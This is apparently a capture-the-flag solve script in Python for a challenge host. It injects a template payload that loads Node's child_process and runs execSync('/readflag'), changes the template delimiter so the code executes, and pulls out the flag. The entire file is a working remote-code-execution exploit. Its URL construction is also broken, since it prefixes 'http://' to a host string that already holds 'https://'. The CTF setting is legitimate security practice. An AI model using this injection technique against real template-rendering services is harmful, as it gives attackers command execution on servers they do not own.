#!/usr/bin/env python3
import requests
import re

HOST = 'https://valentine.kcsc.tf'
PORT = 9086

# write template
r = requests.post(f"http://{HOST}:{PORT}/template", data={"tmpl":"""<.- global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString() .>"""}, allow_redirects=False)

# change delimiter
m = re.search(r"Redirecting to /(?P<uuid>.*)?name=", r.text)
r = requests.get(f"http://{HOST}:{PORT}/{m.group('uuid')}?name=a&delimiter=.")
m = re.search(r"KCSC\{[^}]+\}", r.text)
print(m.group(0))